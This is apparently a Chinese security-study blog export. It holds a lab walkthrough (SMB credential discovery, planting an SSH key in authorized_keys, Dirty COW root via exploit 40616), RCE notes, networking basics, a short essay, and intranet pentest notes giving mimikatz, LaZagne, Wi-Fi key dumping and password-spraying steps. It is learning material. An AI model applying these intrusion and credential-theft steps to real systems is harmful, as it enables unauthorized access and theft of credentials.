<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p><code>网页目录扫描</code>:使用web工具扫描：nikto，dirb，dirbuster<br>这里提供以上三个目录扫描工具的学习链接:<br>dirb:<a href="https://blog.csdn.net/qq_38612882/article/details/122648462">https://blog.csdn.net/qq_38612882/article/details/122648462</a><br>dirbuster:<a href="https://blog.csdn.net/weixin_41489908/article/details/115434107">https://blog.csdn.net/weixin_41489908/article/details/115434107</a><br>nikto:<a href="https://www.cnblogs.com/opama/p/4928657.html">https://www.cnblogs.com/opama/p/4928657.html</a><br><img src="https://pic.imgdb.cn/item/65464ad4c458853aefba575a.jpg"><br><img src="https://pic.imgdb.cn/item/65464aecc458853aefbabbe1.jpg"><br>这里发现了一个readme.txt文件,对这个文件进行访问。<br>发现一个密码,暂时不知道是用来登陆什么的。(可能是ssh或ftp服务的密码)<br><img src="https://pic.imgdb.cn/item/65464b12c458853aefbb53c7.jpg"></p>
<h3 id="尝试FTP匿名登录-21端口"><a href="#尝试FTP匿名登录-21端口" class="headerlink" title="尝试FTP匿名登录(21端口)"></a>尝试FTP匿名登录(21端口)</h3><p>首先知道:anonymous是匿名用户。<br>匿名登陆成功。<br><img src="https://pic.imgdb.cn/item/65464b7bc458853aefbd0723.jpg"><br>那我们操作一下,看一下有什么敏感文件。<br><img src="https://pic.imgdb.cn/item/65464b8ac458853aefbd4562.jpg"><br>如上图,发现不了什么敏感文件,接下来换ssh。</p>
<h3 id="ssh服务-22端口"><a href="#ssh服务-22端口" class="headerlink" title="ssh服务(22端口)"></a>ssh服务(22端口)</h3><p>首先ssh连接的语句:</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ssh</span> smbuser<span class="variable">@ip</span></span><br></pre></td></tr></table></figure>
<p>发现无权限进行操作。(需要公私钥(密钥对)才可进行连接)</p>
<h3 id="SMB共享服务-445端口"><a href="#SMB共享服务-445端口" class="headerlink" title="SMB共享服务(445端口)"></a>SMB共享服务(445端口)</h3><p>由于445端口开启的是SMB共享服务,那么可以有以下思路:<br>使用smbmap对smb信息枚举<br><code>SMBMap允许用户枚举整个域中的samba共享驱动器。用户可以使用该工具列出共享驱动器、驱动器权限、共享内容、上传/下载功能、文件名自动下载模式匹配，甚至远程执行命令。该工具原本的设计初衷是为了简化在大型网络中搜索潜在敏感数据的过程。</code></p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">smbmap</span> -H <span class="number">192.168.146.129</span></span><br></pre></td></tr></table></figure>
<p>发现共享文件夹sbmdata有读写权限。<br><img src="https://pic.imgdb.cn/item/65464ba1c458853aefbda5cb.jpg"><br>使用smbclient来连接这个文件夹试一试(交互式登录),密码还是尝试刚才获取到的,成功连接。<br><img src="https://pic.imgdb.cn/item/65464bcac458853aefbe4f5a.jpg"><br>get secure后,在文件夹查看,发现一个用户名密码(这个用户名是用来登录ftp的重要key)。<br><img src="https://pic.imgdb.cn/item/65464bddc458853aefbe9e91.jpg"></p>
<h2 id="开干"><a href="#开干" class="headerlink" title="开干"></a>开干</h2><p>那其实这里其实有思路了,<code>就是通过smbdata的可写操作伪造私钥,实现ssh登录从而getshell。</code></p>
<h3 id="查看ssh配置文件"><a href="#查看ssh配置文件" class="headerlink" title="查看ssh配置文件"></a>查看ssh配置文件</h3><p>登录ftp查看ssh配置文件(由于前面是匿名用户所以看不到配置文件)。<br>经过尝试用户名为smbuser,密码为rootroot1,登陆后get ssh配置文件。<br><img src="https://pic.imgdb.cn/item/65464bf0c458853aefbef2dd.jpg"><br>在kali文件夹查看ssh配置文件,发现用户密钥文件存放路径为~&#x2F;.ssh&#x2F;authorized_keys。<br><img src="https://pic.imgdb.cn/item/65464c0cc458853aefbf6ac3.jpg"></p>
<h3 id="伪造公钥私钥并且上传"><a href="#伪造公钥私钥并且上传" class="headerlink" title="伪造公钥私钥并且上传"></a>伪造公钥私钥并且上传</h3><p>别急着关闭ftp服务,然后在smbuser用户下创建一个ssh目录，用于伪造公钥和私钥创建连接。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> ~/.ssh</span><br></pre></td></tr></table></figure>
<p>新打开一个shell窗口，创建公钥和私钥</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ssh-keygen -t rsa</span></span><br></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/65464c2bc458853aefbff51e.jpg"><br>然后上传公钥到.ssh&#x2F;authorized_keys目录下</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">put <span class="regexp">/root/</span>.ssh<span class="regexp">/id_rsa.pub ~/</span>.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/65464c42c458853aefc05960.jpg"></p>
<h3 id="脏牛提权"><a href="#脏牛提权" class="headerlink" title="脏牛提权"></a>脏牛提权</h3><p>这时尝试使用ssh连接,成功登陆上,但是权限太低了,查看内核版本号发现可以使用脏牛提权。<br><img src="https://pic.imgdb.cn/item/65464c57c458853aefc0bceb.jpg"><br>接下来就进行脏牛提权<br>新开一个shell,键入</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">searchsploit <span class="keyword">dirty </span>   <span class="comment">#搜索漏洞库</span></span><br><span class="line">searchsploit -m <span class="number">40616</span>.c  <span class="comment">#下载到本地</span></span><br></pre></td></tr></table></figure>
<p>继续开启ftp服务，上传脏牛文件到靶机。<br><img src="https://pic.imgdb.cn/item/65464d4ec458853aefc58fb6.png"><br>然后使用ssh连接,gcc编译提权。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -ptheard dirty.c -o dirty -lcrypt <span class="comment">#gcc编译</span></span><br><span class="line">./dirty 123456 <span class="comment">#运行</span></span><br></pre></td></tr></table></figure>
<p>成功提权,成为root。<br><img src="https://pic.imgdb.cn/item/65464c66c458853aefc10c7a.jpg"></p>
<h3 id="获取flag"><a href="#获取flag" class="headerlink" title="获取flag"></a>获取flag</h3><p>最后便可以开心的获取flag啦！<br><img src="https://pic.imgdb.cn/item/65464cfec458853aefc42e7d.jpg"></p>
<h2 id="总结-一些觉得有用的klg"><a href="#总结-一些觉得有用的klg" class="headerlink" title="总结|一些觉得有用的klg"></a>总结|一些觉得有用的klg</h2><p>1、这是我第一次打这种靶机,学习到了不少知识点,这种需要依靠你一步一步扫描探索的靶机是会比打那些ctf更全面一点点的。<br>2、主要渗透思路:扫描主机、扫描端口、扫描目录、根据端口进行测试。<br>3、匿名用户是anonymous。<br>以下知识点from:<a href="https://www.cnblogs.com/dg05/p/17805595.html">https://www.cnblogs.com/dg05/p/17805595.html</a><br>4、searchsploit<br>searchsploit是集成在kali中的命令。kali中有一个本地漏洞库，可以searchsploit命令进行漏洞查询，查询成功后可以看到对应的exp<br>searchsploit的简单使用：<br>查找linux内核版本3.1的漏洞：searchsploit linux kernel 3.1<br>配合grep查找内核3.1的提权漏洞：searchsploit linux kernel 3.1 | grep ‘Privilge Escalation’<br>假如exp为40616.c，将其拷贝到当前目录：earchsploit -m 40616 <br>5、ssh-keygen<br>ssh-keygen是生成公私钥的工具，默认保存在~&#x2F;.ssh中，私钥为id_rsa，公钥为id_rsa.pub<br>参数：<br>-t，指定生成密钥类型（rsa，dsa），默认rsa<br>-f，指定存放密钥的路径，默认~&#x2F;.ssh<br>-P，指定私钥的密码<br>如:</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ssh-keygen -t rsa</span></span><br></pre></td></tr></table></figure>
<p>6、ssh免密登录<br>  1.在客户端用ssh-keygen生成公私钥。<br>  2.将公钥追加到服务器的authorized_keys文件中（一般在用户家目录的.ssh下,有时候还需要自己创建）。<br>  3.客户端通过ssh对服务器发起请求，并把公钥传递到服务器。<br>  4.服务器检索authorized_keys，确认公钥是否存在。<br>  5.如果存在，生成随机数R，并用公钥加密。<br>  6.将密文传输到客户端。<br>  7.客户端用私钥解密密文，得到R。<br>  8.服务端和客户端通信会产生一个会话id（SessionKey），客户端用md5对R和SessionKey加密生成密文。<br>  9.客户端将md5密文传给服务器。<br>  10.服务器端同样生成md5(R,SessionKey)。<br>  11.如果两个密文匹配，则认证成功,实现了ssh免密登录。</p>
]]></content>
      <categories>
        <category>Recorder</category>
      </categories>
      <tags>
        <tag>实战练习心得</tag>
      </tags>
  </entry>
  <entry>
    <title>RCE|代码以及命令执行漏洞</title>
    <url>/2023/10/14/minglingzhixing/</url>
    <content><![CDATA[<h2 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h2><p>在 Web 应用中有时候程序员为了考虑灵活性、简洁性，会在代码调用 代码或命令执行函数去处理。比如当应用在调用一些能将字符串转化成代 码的函数时，没有考虑用户是否能控制这个字符串，将造成代码执行漏洞。同样调用系统命令处理，将造成命令执行漏洞。<br><img src="https://pic.imgdb.cn/item/6529fdd5c458853aefdf09c9.png" alt="图一" title="RCE漏洞图解"><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=29&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">分析漏洞产生原因:15:00</a></p>
<h3 id="漏洞形成条件-缺一不可"><a href="#漏洞形成条件-缺一不可" class="headerlink" title="漏洞形成条件(缺一不可)"></a>漏洞形成条件(缺一不可)</h3><p>1、可控变量<br>2、漏洞函数</p>
<h2 id="具体分析"><a href="#具体分析" class="headerlink" title="具体分析"></a>具体分析</h2><p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=29&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">两个小案例略微说明这两种漏洞:5:50</a><br>1、代码执行漏洞典例:php eval()函数:把括号内的语句当作php代码执行。<br>2、命令执行漏洞典例:php system()函数:把()的内容当作当前操作系统cmd命令执行,并可以通过echo输出。<br>3、可以知道,利用这个漏洞,可以对系统产生多样的危害。例如,我可以利用文件上传的函数(代码执行)上传一个木马文件,然后通过命令执行漏洞去执行这个木马。<br>4、此类漏洞相对较前面那几类漏洞在网站的出现几率要小,要具体看网站的作用。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=29&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">如何测试是否存在两种漏洞:23:10</a><br>1、主要是具体情况具体分析,看页面主要是为了完成什么任务。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=29&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">mozhe靶场演示命令执行漏洞(黑盒)–黑盒功能点命令执行-应用功能:28:00</a><br>1、linux下|符号可以执行多条命令(管道服务)。<br>2、”&lt;”是空格的另一种形式&#x2F;输入重定向?–cat&lt;a.php<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=29&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">mozhe靶场演示命代码执行漏洞(白盒)–白盒代码及命令执行-代码分析:43:00</a><br>1、tac k.php(反引号执行系统命令)–相当于读取k.txt<br>2、echo可以显示命令执行结果。对于eval(),正常来说是代码执行,但是若是eval(echo&#96;&#96;),则是命令执行–linux特性,反单引号可以执行系统命令。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=29&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">黑盒层 RCE 漏洞检测-公开漏洞:1:00:00</a><br>1、学会利用网上公开的漏洞辅助。<br>2、poc是验证漏洞是否存在、exp是利用漏洞<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=29&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">webshell一句话后门初步原理理解–菜刀、蚁剑原理:1:26:20</a></p>
<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>1、敏感函数禁用:如eval、assert等<br>2、变量过滤或固定(固定常用)<br>3、WAF产品</p>
]]></content>
      <categories>
        <category>代码|命令执行漏洞</category>
      </categories>
      <tags>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>内网|外网|小姿势</title>
    <url>/2023/11/05/neiwang/</url>
    <content><![CDATA[<p>今天道听途说地听到一些计网知识,权当复习吧,记录一下。</p>
<h2 id="内网-外网"><a href="#内网-外网" class="headerlink" title="内网|外网"></a>内网|外网</h2><p>1、内网简单来说就是在同一个路由器连接下,所有主机的一个集合体构成了一个内网。<br>2、外网简单来说就是内网外的互联网,如谷歌、百度这些。</p>
<h2 id="内网ip-外网ip"><a href="#内网ip-外网ip" class="headerlink" title="内网ip|外网ip"></a>内网ip|外网ip</h2><p>外网ip(非保留ip)|内网ip(保留ip)<br>1、内网可以通过NAT,端口映射的方式,内网的所有主机共同拥有一个外网ip,这才可以上网(连到外网)。<br>2、而外网ip在原则上访问不了内网。<br>3、我们平时直接接触最多的是内网IP。而且还可以自己手动修改IP地址。而外网IP，我们很少直接接触，都是间接接触、因为外网IP一般都是运营商管理，而且是全球唯一的，一般我们自己是无法修改的。<br>4、内网IP和外网IP是指在网络中用于标识计算机或其他设备的地址。内网IP是指在局域网中使用的IP地址，外网IP是指在公共网络中使用的IP地址。<br>内网IP通常由路由器或交换机分配，它们是在私有地址空间中的IP地址，如10.0.0.0&#x2F;8、172.16.0.0&#x2F;12和192.168.0.0&#x2F;16。这些地址是专门为内部使用而保留的，因此无法从公共网络中访问。内网IP可以在一个局域网中共享，而无需公共网络的支持。这意味着内网IP可以更快地传输数据，因为它们不需要经过公共网络的路由器和服务器。<br>外网IP是指在公共网络中使用的IP地址。这些地址是由互联网服务提供商（ISP）分配的，它们是全球唯一的。外网IP可以通过公共网络访问，因此可以从任何地方访问。这是因为外网IP是在全球范围内唯一的，它们用于标识互联网上的每个设备。<br>5、外网IP是必要的，因为它们允许设备在互联网上相互通信。例如，当您访问网站或发送电子邮件时，您的设备需要使用外网IP地址与互联网上的其他设备进行通信。<br>6、内网IP和外网IP都是用于标识计算机或其他设备的地址，但它们在使用和访问方面有所不同。内网IP只能在局域网中使用，而外网IP可以在全球范围内访问。<br>7、在一定程度上,外网&#x3D;公网;内网&#x3D;私网。<br><code>from</code><br><a href="https://blog.csdn.net/m0_61251376/article/details/122667739">https://blog.csdn.net/m0_61251376/article/details/122667739</a><br><a href="https://zhuanlan.zhihu.com/p/650583255?utm_id=0">https://zhuanlan.zhihu.com/p/650583255?utm_id=0</a></p>
<h2 id="网关-路由器"><a href="#网关-路由器" class="headerlink" title="网关|路由器"></a>网关|路由器</h2><p>1、网关是一个局域网连接到另一个局域网的接口;路由器是连接一个局域网所有主机的设备。<br>2、也就是说,一个局域网内的所有主机通过路由器连接,在通过网关才可与另一个局域网连接通讯。<br><code>from</code><br><a href="https://www.zhihu.com/question/21787311/answer/2683696971">https://www.zhihu.com/question/21787311/answer/2683696971</a></p>
<h2 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h2><p>1、前面说到,内网可以通过NAT、端口映射的方式来访问外网;而外网在原则上不可连接到内网。<br>可以通过端口映射、VPN等的方式实现从外网访问到内网资源。<br>2、那么作为一名渗透测试人员,我们是不是应该想到有没有可能通过外网非法访问内网,实现攻击？<br>答案是肯定的,这就是内网穿透。<br><code>学习链接</code><br><a href="https://blog.csdn.net/qq_61553520/article/details/131037631">https://blog.csdn.net/qq_61553520/article/details/131037631</a><br><a href="https://zhuanlan.zhihu.com/p/604809193?utm_id=0">https://zhuanlan.zhihu.com/p/604809193?utm_id=0</a></p>
]]></content>
      <categories>
        <category>道听途说随笔记</category>
      </categories>
      <tags>
        <tag>WEB漏洞知识</tag>
      </tags>
  </entry>
  <entry>
    <title>My First Blog</title>
    <url>/2023/09/10/one/</url>
    <content><![CDATA[<p>   落日像喝醉酒的红脸醉汉，跌倒在乡村的山那里，把水和天映得一半通红，一半金黄。<br>　　乡村的黄昏是秀美、恬静的。<br>　　路边的花呀、草呀，都在徐徐晚风的抚摸下，安静地睡了，夜来香们却精神十足地梳妆打扮，<br>准备迎接“黄昏音乐会”，她们用绚丽的晚霞做胭脂，涂红娇美的脸蛋；用金黄的阳光做长裙，套<br>上柔韧的腰肢，向小河哥哥要一朵浪花，插上自己五彩的秀发……河边的垂柳散开高高的发髻，取下<br>美艳的蝴蝶结，俯下身去，让长发垂进潺潺的.流水，静静梳洗着。顽皮的小河也不再跳跃，安分地<br>淌着。河里的睡莲闭起了眼睑，弯弯的长睫毛上还挂着水珠。河里的小鱼和小虾们都回家了，想必<br>是他们的爸爸、妈妈召唤着他们吃晚饭吧！<br>　　乡村的黄昏又是忙碌、热闹的。<br>　　“日落西山鸟归林。”形形色色的鸟儿都急急忙忙地往屋里赶。鸟爸爸要把找到的食物带回<br>家，鸟妈妈要回去做饭，仅有一些贪玩的小鸟还在不紧不慢地往家里赶。<br>　　河边的洗衣妇提着水桶三三两两回来了，边走边谈论着村里的新鲜事，放牛的牧童横坐在牛背<br>上归来了，口袋里塞满了酸极甜极的野果。到地里做活的壮劳力也都回来了，个个扛着农具，汗流<br>浃背。不一会儿，各家各户的烟囱都冒出了缕缕炊烟，厨房的响起了锅碗瓢盆的交响乐，吃过晚<br>饭，一些老头儿叼着烟斗蹲在一起谈古论今，谈三国，谈刘备……<br>　　这时，一弯新月已隐隐约约挂在夜空，少年也匆匆踏上了归途。</p>
]]></content>
      <categories>
        <category>道听途说随笔记</category>
      </categories>
      <tags>
        <tag>发牢骚</tag>
      </tags>
  </entry>
  <entry>
    <title>内网安全</title>
    <url>/2023/12/05/neiwangSecury/</url>
    <content><![CDATA[<h1 id="内网安全-域横向-工作组-局域网探针"><a href="#内网安全-域横向-工作组-局域网探针" class="headerlink" title="内网安全|域横向|工作组|局域网探针"></a>内网安全|域横向|工作组|局域网探针</h1><p><img src="https://pic.imgdb.cn/item/656f2bd2c458853aef75e27b.webp"><br><img src="https://pic.imgdb.cn/item/656f3821c458853aefbb0c39.webp"></p>
<h2 id="内网-基本概念"><a href="#内网-基本概念" class="headerlink" title="内网|基本概念"></a>内网|基本概念</h2><p><code>基本名词</code><br>1、DMZ区，即隔离区或非军事化区，是内网和外网间的缓冲区，用于放置一些必须公开的服务器，如web服务器。在保护了内部网络的同时，解决了安装防火墙后外部网络的访问用户不能访问内部网络服务器的问题。<br>2、工作组（Work Group）是局域网中的一个概念。它是最常见最简单最普通的资源管理模式，就是将不同的电脑按功能分别列入不同的组中，以方便管理，适合小型网络（不需要域管理器）。<br>3、域环境：和工作组类似，但是由域控制器（DC）–相当于root，统一管理，更适合大型网络<br>域环境不等于局域网。<br>4、活动目录(AD)：相当于功能主机，域内实现什么功能由此管理。<br>5、单域、父域、子域;父域、子域这两个概念在多域情况下会产生。<br>6、域数、域森林<br><code>基本认知</code><br>1、Linux域渗透问题<br>Linux实现域的功能需要安装LDAP，功能不如域强且技术要求高，较少被使用，所以大部分是用win server实现域的功能。<br>2、局域网技术适用问题<br>有些局域网内的攻击方法在域内不生效<br>域通常指的是互联网上的一个区域，而局域网是指一个特定地理区域内的网络。因此，域和局域网并不等同。域通常指的是一个由一组计算机和网络设备组成的逻辑组织，可以跨越不同的地理位置，而局域网通常指的是一个特定地理区域内的网络，比如一个办公室、学校或者家庭网络。因此，域和局域网是不同的概念。<br>3、大概内网安全流程问题<br>信息收集-权限提升-横向渗透-权限维持<br>4、</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">对于一台主机，本地用户的权限通常比域内用户的权限更大。本地用户可以访问本地计算机上的所有资源和文件，而域内用户只能访问其在域中分配的权限和资源。但是，如果管理员在域中为某个域用户分配了本地管理员权限，那么该域用户的权限将与本地用户相同；</span><br><span class="line">域内用户可以登录到域内任意一台主机，但是权限可能没有本地用户那么高，同时，域内主机可以配置为禁止域内用户登录，只允许本地登录。</span><br></pre></td></tr></table></figure>
<h2 id="内网-初学-具体分析"><a href="#内网-初学-具体分析" class="headerlink" title="内网|初学|具体分析"></a>内网|初学|具体分析</h2><h3 id="一、基本信息收集"><a href="#一、基本信息收集" class="headerlink" title="一、基本信息收集"></a>一、基本信息收集</h3><p>旨在了解当前服务器的计算机基本信息，为后续判断服务器角色，网络环境等做准备<br>cmd输入</p>
<figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">systeminfo 详细信息</span><br><span class="line"><span class="built_in">net</span> <span class="built_in">start</span> 启动服务</span><br><span class="line">tasklist 进程列表</span><br><span class="line">schtasks 计划任务</span><br></pre></td></tr></table></figure>
<p>其中，schtasks这条指令可能运行不了，可能是权限不够。</p>
<h3 id="二、网络信息收集"><a href="#二、网络信息收集" class="headerlink" title="二、网络信息收集"></a>二、网络信息收集</h3><p>旨在了解当前服务器的网络接口信息，为判断当前角色，功能，网络架构做准备<br>cmd输入</p>
<figure class="highlight dos"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ipconfig</span> /all 判断存在域：根据是否有“主DNS后缀”一栏判断是否存在域</span><br><span class="line"><span class="built_in">net</span> view /domain 判断存在域：能成功返回说明存在域</span><br><span class="line"><span class="built_in">net</span> <span class="built_in">time</span> /domain 判断主域：会返回主域的时间，可以确定主域名，配合“nslookup”“<span class="built_in">ping</span>”确定IP地址</span><br><span class="line">netstat -ano 当前网络端口开放</span><br><span class="line">nslookup 域名 追踪来源地址</span><br></pre></td></tr></table></figure>
<p><code>其中</code><br>ipconfig &#x2F;all可以判断当前计算机网络环境是否为工作组&#x2F;域环境，根据是否有“主DNS后缀”一栏判断是否存在域环境。<br>假设域为god.org,有一台域控下的主机，webserver.god.org,还有dralin.webserver.god.org，那么就是多域的情况dralin.webserver.god.org是子域。<br>net time &#x2F;domain 会返回主域的时间以及主域主机的名字<br>配合以下两条命令确定域控主机的IP地址</p>
<figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">nslookup &quot;<span class="built_in">net</span> <span class="built_in">time</span> /domain返回的主机名&quot; </span><br><span class="line"><span class="built_in">ping</span> <span class="built_in">net</span> &quot;<span class="built_in">time</span> /domain返回的主机名&quot;</span><br></pre></td></tr></table></figure>
<h3 id="三、用户信息收集"><a href="#三、用户信息收集" class="headerlink" title="三、用户信息收集"></a>三、用户信息收集</h3><p>旨在了解当前计算机或域环境下的用户及用户组信息，便于后期利用凭据进行测试（爆破跑密码凭据）<br>系统默认常见用户(组)身份：<br>Domain Admins：域管理员（默认对域控制器有完全控制权）<br>Domain Computers：域内机器<br>Domain Controllers：域控制器<br>Domain Guest：域访客，权限低<br>Domain Users：域用户<br>Enterprise Admins：企业系统管理员用户（默认对域控制器有完全控制权）<br><code>所以</code>主要攻击两个admins组内成员；知道大部分成员主机存在于域用户。<br><code>相关用户收集操作命令：</code></p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">whoami /<span class="keyword">all</span> 用户权限</span><br><span class="line">net config workstation 登录信息</span><br><span class="line">net <span class="keyword">user</span> 本地用户</span><br><span class="line">net localgroup 本地用户组</span><br><span class="line">net <span class="keyword">user</span> /<span class="keyword">domain</span> 获取域用户信息</span><br><span class="line">net <span class="keyword">group</span> /<span class="keyword">domain</span> 获取域用户组信息</span><br><span class="line">wmic useraccount <span class="keyword">get</span> /<span class="keyword">all</span> 涉及域用户详细信息</span><br><span class="line">net <span class="keyword">group</span> &quot;Domain Admins&quot; /<span class="keyword">domain</span> 查询域管理员账户</span><br><span class="line">net <span class="keyword">group</span> &quot;Enterprise Admins&quot; /<span class="keyword">domain</span> 查询管理员用户组</span><br><span class="line">net <span class="keyword">group</span> &quot;Domain Controllers&quot; /<span class="keyword">domain</span> 查询域控制器</span><br></pre></td></tr></table></figure>
<p><code>要分清本地用户以及域用户，域用户在本机操作可能受限。因为本机的用户可能不属于本地管理员组且是域成员，权限不够，这也是要优先进行权限提升的原因</code></p>
<h3 id="四、凭据信息收集"><a href="#四、凭据信息收集" class="headerlink" title="四、凭据信息收集"></a>四、凭据信息收集</h3><p>旨在收集各种密文，明文，口令等，为后续横向渗透做好测试准备<br><code>脚本</code><br>计算机用户 HASH，明文获取-mimikatz(win)，mimipenguin(linux)<br>计算机各种协议服务口令获取-LaZagne(all)，XenArmor(win)<br><code>计算机各种协议服务口令收集目标</code><br>1.站点源码备份文件、数据库备份文件等<br>2.各类数据库 Web 管理入口，如PHPMyAdmin<br>3.浏览器保存密码、浏览器 Cookies<br>4.其他用户会话、3389 和 ipc$连接记录、回收站内容<br>5.Windows 保存的 WIFI 密码<br>6.网络内部的各种帐号和密码，如：Email、VPN、FTP、OA 等<br><code>反正就是收集电脑上有保存的隐私信息，这个还是挺重要的，拿到一台保存的密码后我可以以此作为字典，继续尝试看看其他的用户是否相同密码</code><br><code>命令</code><br>Netsh WLAN show profiles 查看自己电脑连接过的wifi<br>Netsh WLAN show profile name&#x3D;”无线名称” key&#x3D;clear 查看自己电脑连接过的wifi密码，其中的“关键内容”对应的就是密码。<br><code>1、mimikatz使用方法</code><br>作用：获取本计算机的所有用户的密码（登录凭据）。<br>适用于windows系统，需要高权限账户(所以要先权限提升)<br>获取权限</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">    privilege::debug</span><br></pre></td></tr></table></figure>
<p>获取计算机信息，包括用户的账号密码</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">    sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
<p><code>2、mimipenguin使用方法</code><br>适用于Linux系统，有.py和.sh两个版本，需要高权限账户<br><code>3、LaZagne使用方法</code><br>全系统适用，从浏览器、聊天软件、数据库等获取账号密码<br>以windows版为例，运行该程序，选择all</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">    LaZagne<span class="selector-class">.exe</span> <span class="attribute">all</span></span><br></pre></td></tr></table></figure>
<p><code>4、XenArmor使用方法</code><br>该软件收费<br>选择“setting”，选择需要搜索密码的协议，配置被破解软件的路径，“Save”<br>选择“Recover Passwords” </p>
<h3 id="五、探针主机域控架构服务"><a href="#五、探针主机域控架构服务" class="headerlink" title="五、探针主机域控架构服务"></a>五、探针主机域控架构服务</h3><p>为后续横向思路做准备，针对应用，协议等各类攻击手法<br>探针域控制器名及地址信息<br>net time &#x2F;domain、nslookup、ping<br>探针域内存活主机及地址信息<br>nbtscan [网段]&#x2F;nbtscan 192.168.3.0&#x2F;24 第三方工具（但是要考虑免杀）</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">for</span> /L %I in (<span class="number">1</span>,<span class="number">1</span>,<span class="number">254</span>) DO @ping -w <span class="number">1</span> -n <span class="number">1</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.%I | findstr <span class="string">&quot;TTL=&quot;</span> 自带内部命令（推荐）</span><br></pre></td></tr></table></figure>
<p>nmap、masscan，第三方PowerShell脚本<code>nishang</code>、empire等</p>
<h4 id="nishang使用方法"><a href="#nishang使用方法" class="headerlink" title="nishang使用方法"></a>nishang使用方法</h4><p>下载nishang后拖入待测主机<br>1、打开“Windows PowerShell”，来到软件所在的目录（可以Tab键补全）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">    <span class="built_in">cd</span> .\Desktop\nishang-master</span><br></pre></td></tr></table></figure>
<p>2、导入模块nishang</p>
<figure class="highlight coq"><table><tr><td class="code"><pre><span class="line">   <span class="keyword">Import</span>-<span class="keyword">Module</span> .\nishang.psm1</span><br></pre></td></tr></table></figure>
<p>3、设置执行策略（初次执行或导入不了时）</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">Set</span>-ExecutionPolicy <span class="comment">RemoteSigned</span></span><br></pre></td></tr></table></figure>
<p>4、获取模块nishang的命令函数<br>    Get-Command -Module nishang<br><code>成功进入后，输入对应的参数使用功能</code><br>1、获取常规计算机信息</p>
<figure class="highlight mathematica"><table><tr><td class="code"><pre><span class="line">   <span class="built_in">Get</span><span class="operator">-</span><span class="built_in">Information</span></span><br></pre></td></tr></table></figure>
<p>2、端口扫描（查看目录对应文件有演示语法，其他同理）</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line">    <span class="attribute">Invoke</span>-PortScan -StartAddress <span class="number">192.168.3.0</span> -EndAddress <span class="number">192.168.3.100</span> -ResolveHost -ScanPort</span><br></pre></td></tr></table></figure>
<p>3、其他功能：删除补丁，反弹 Shell，凭据获取等</p>
<h3 id="六、探针域内主机角色及服务信息"><a href="#六、探针域内主机角色及服务信息" class="headerlink" title="六、探针域内主机角色及服务信息"></a>六、探针域内主机角色及服务信息</h3><p>探针域内主机角色及服务信息<br>利用开放端口服务及计算机名判断<br>核心业务机器:<br>1.高级管理人员、系统管理员、财务&#x2F;人事&#x2F;业务人员的个人计算机<br>2.产品管理系统服务器<br>3.办公系统服务器<br>4.财务应用系统服务器<br>5.核心产品源码服务器（自建 SVN、GIT）<br>6.数据库服务器<br>7.文件或网盘服务器、共享服务器<br>8.电子邮件服务器<br>9.网络监控系统服务器<br>10.其他服务器（内部技术文档服务器、其他监控服务器等）</p>
<h1 id="内网安全-横向渗透"><a href="#内网安全-横向渗透" class="headerlink" title="内网安全|横向渗透"></a>内网安全|横向渗透</h1><p><img src="https://pic.imgdb.cn/item/6572bc50c458853aefcf4b6c.webp"><br>内网横向渗透攻击思路<br><code>确保是以域内用户收集信息，以本地用户去进行横向渗透（不会受域控限制）</code><br>1、通过mimikatz收集明文或hash值的密码，“net user &#x2F;domain”收集域内的用户名，“for &#x2F;L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.3.%I | findstr “TTL&#x3D;””探索域内存活地址<br>2、批量扫描，用密码撞库<br>3、收集更多密码<br>4、重复2、3步 </p>
